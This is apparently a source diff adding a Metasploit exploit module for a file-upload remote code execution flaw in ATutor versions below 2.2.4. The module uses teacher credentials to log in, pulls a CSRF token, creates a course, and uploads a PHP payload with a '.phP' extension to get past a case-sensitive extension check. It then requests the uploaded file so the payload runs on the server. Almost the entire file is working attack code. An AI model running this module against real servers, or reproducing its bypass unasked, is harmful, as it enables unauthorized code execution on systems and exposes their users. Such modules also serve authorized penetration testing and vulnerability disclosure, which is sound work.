@@ -1,0 +1,287 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "ATutor < 2.2.4 'file_manager' Remote Code Execution",
+      'Description'    => %q{
+         This module allows the user to run commands on the server with teacher user privilege.
+         The 'Upload files' section in the 'File Manager' field contains arbitrary file upload vulnerability.
+         The "$IllegalExtensions" function has control weakness and shortcomings.
+         It is possible to see illegal extensions within "constants.inc.php". (exe|asp|php|php3|php5|cgi|bat...)
+         However, there is no case-sensitive control. Therefore, it is possible to bypass control with filenames such as ".phP", ".Php"
+         It can also be used in dangerous extensions such as "shtml" and "phtml". 
+         The directory path for the "content" folder is located at "config.inc.php".
+         For the exploit to work, the "define ('AT_CONTENT_DIR', 'address')" content folder must be located in the web home directory or the address must be known.
+
+         This exploit creates a course with the teacher user and loads the malicious php file into server.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & MSF Module
+        ],
+      'References'     =>
+        [
+          [ 'CVE', ''  ],
+          [ 'URL', 'http://pentest.com.tr/exploits/ATutor-2-2-4-file-manager-Remote-Code-Execution-Injection-Metasploit.html' ],
+          [ 'URL', 'https://atutor.github.io/' ],
+          [ 'URL', 'http://www.atutor.ca/' ]
+        ],
+      'Privileged'     => false,
+      'Payload'        =>
+        {
+          'DisableNops' => true,
+        },
+      'Platform'       => ['php'],
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [[ 'Automatic', { }]],
+      'DisclosureDate' => '09 April 2019',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The path of Atutor', '/ATutor/']),
+        OptString.new('USERNAME', [true, 'The Teacher Username to authenticate as']),
+        OptString.new('PASSWORD', [true, 'The Teacher password to authenticate with']),
+        OptString.new('CONTENT_DIR', [true, 'The content folder location', 'content'])
+      ],self.class)
+  end
+
+  def exec_payload
+
+    send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, "#{datastore['CONTENT_DIR']}", @course_id, "#{@fn}")
+    })
+  end
+
+  def peer
+    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
+  end
+
+  def print_status(msg='')
+    super("#{peer} - #{msg}")
+  end
+
+  def print_error(msg='')
+    super("#{peer} - #{msg}")
+  end
+
+  def print_good(msg='')
+    super("#{peer} - #{msg}")
+  end
+##
+# Version and Vulnerability Check
+##
+  def check
+
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, "#{datastore['CONTENT_DIR']}/")
+    })
+
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    if res.code == 404
+       return Exploit::CheckCode::Safe
+    end
+    return Exploit::CheckCode::Appears
+  end
+##
+# csrftoken read and create a new course
+##
+  def create_course(cookie, check)
+
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri' => normalize_uri(target_uri.path, "mods", "_core", "courses", "users", "create_course.php"),
+      'headers' =>
+      {
+        'Referer' => "#{peer}#{datastore['TARGETURI']}users/index.php",
+        'cookie'   => cookie,
+      },
+      'agent' => 'Mozilla'
+    })
+
+    if res && res.code == 200 && res.body =~ /Create Course: My Start Pag/
+      @token = res.body.split('csrftoken"  value="')[1].split('"')[0]
+    else
+      return false
+    end 
+
+    @course_name = Rex::Text.rand_text_alpha_lower(5)
+    post_data = Rex::MIME::Message.new
+    post_data.add_part(@token, nil, nil,'form-data; name="csrftoken"')
+    post_data.add_part('true', nil, nil, 'form-data; name="form_course"')
+    post_data.add_part(@course_name, nil, nil, 'form-data; name="title"')
+    post_data.add_part('top', nil, nil, 'form-data; name="content_packaging"')
+    post_data.add_part('protected', nil, nil, 'form-data; name="access"')
+    post_data.add_part('Save', nil, nil, 'form-data; name="submit"')
+    data = post_data.to_s
+
+    res = send_request_cgi({
+      'method' => 'POST',    
+      'data'  => data,
+      'agent' => 'Mozilla',
+      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
+      'cookie' => cookie,
+      'uri' => normalize_uri(target_uri.path, "mods", "_core", "courses", "users", "create_course.php")     
+    })
+
+    location = res.redirection.to_s
+    if res && res.code == 302 && location.include?('bounce.php?course')
+      @course_id = location.split('course=')[1].split("&p")[0]
+      return true
+    else
+      return false
+    end
+  end
+##
+# Upload malicious file // payload integration
+##
+  def upload_shell(cookie, check)
+
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri' => normalize_uri(target_uri.path, "bounce.php?course=" + @course_id),
+      'headers' =>
+      {
+        'Referer' => "#{peer}#{datastore['TARGETURI']}users/index.php",
+        'cookie'   => cookie,
+      },
+      'agent' => 'Mozilla'
+    })
+
+    ucookie = "ATutorID=#{$2};" if res.get_cookies =~ /ATutorID=(.*); ATutorID=(.*);/
+
+    file_name = Rex::Text.rand_text_alpha_lower(8) + ".phP"
+    @fn = "#{file_name}"
+    post_data = Rex::MIME::Message.new
+    post_data.add_part('10485760', nil, nil, 'form-data; name="MAX_FILE_SIZE"')
+    post_data.add_part(payload.encoded, 'application/octet-stream', nil, "form-data; name=\"uploadedfile\"; filename=\"#{file_name}\"")
+    post_data.add_part('Upload', nil, nil, 'form-data; name="submit"')
+    post_data.add_part('', nil, nil, 'form-data; name="pathext"')
+
+    data = post_data.to_s
+
+    res = send_request_cgi({
+      'method' => 'POST',    
+      'data'  => data,
+      'agent' => 'Mozilla',
+      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
+      'cookie' => ucookie,
+      'uri' => normalize_uri(target_uri.path, "mods", "_core", "file_manager", "upload.php")     
+    })
+
+    if res && res.code == 302 && res.redirection.to_s.include?('index.php?pathext')
+      print_status("Trying to upload #{file_name}")
+      return true
+    else
+      print_status("Error occurred during uploading!")
+      return false
+    end
+  end
+##
+# Password encryption with csrftoken
+##
+  def get_hashed_password(token, password, check)
+    if check
+      return Rex::Text.sha1(password + token)
+    else
+      return Rex::Text.sha1(Rex::Text.sha1(password) + token)
+    end
+  end
+##
+# User login operations
+##
+  def login(username, password, check)
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, "login.php"),
+      'agent' => 'Mozilla',
+    })
+
+    token = $1 if res.body =~ /\) \+ \"(.*)\"\);/
+    cookie = "ATutorID=#{$1};" if res.get_cookies =~ /; ATutorID=(.*); ATutorID=/
+    if check
+      password = get_hashed_password(token, password, true)
+    else
+      password = get_hashed_password(token, password, false)
+    end
+
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, "login.php"),
+      'vars_post' => {
+        'form_password_hidden' => password,
+        'form_login' => username,
+        'submit' => 'Login'
+      },
+      'cookie' => cookie,
+      'agent' => 'Mozilla'
+    })
+    cookie = "ATutorID=#{$2};" if res.get_cookies =~ /(.*); ATutorID=(.*);/
+
+    if res && res.code == 302
+       if res.redirection.to_s.include?('bounce.php?course=0')
+        res = send_request_cgi({
+          'method'   => 'GET',
+          'uri'      => normalize_uri(target_uri.path, res.redirection),
+          'cookie' => cookie,
+          'agent' => 'Mozilla'
+        })
+        cookie = "ATutorID=#{$1};" if res.get_cookies =~ /ATutorID=(.*);/
+        if res && res.code == 302 && res.redirection.to_s.include?('users/index.php')
+           res = send_request_cgi({
+             'method'   => 'GET',
+             'uri'      => normalize_uri(target_uri.path, res.redirection),
+             'cookie' => cookie,
+             'agent' => 'Mozilla'
+           })
+           cookie = "ATutorID=#{$1};" if res.get_cookies =~ /ATutorID=(.*);/
+           return cookie
+          end
+       else res.redirection.to_s.include?('admin/index.php')
+          fail_with(Failure::NoAccess, 'The account is the administrator. Please use a teacher account!')
+          return cookie
+       end
+    end
+
+    fail_with(Failure::NoAccess, "Authentication failed with username #{username}")
+    return nil
+  end
+##
+# Exploit controls and information
+##
+  def exploit
+    tcookie = login(datastore['USERNAME'], datastore['PASSWORD'], false)
+    print_good("Logged in as #{datastore['USERNAME']}")
+
+    if create_course(tcookie, true)
+      print_status("CSRF Token : " + @token)
+      print_status("Course Name : " + @course_name + " Course ID : " + @course_id)
+      print_good("New course successfully created.")
+    end
+
+    if upload_shell(tcookie, true)
+      print_good("Upload successfully.")
+      print_status("Trying to exec payload...")
+      exec_payload
+    end
+  end
+end
+##
+# The end of the adventure (o_O) // AkkuS
+##
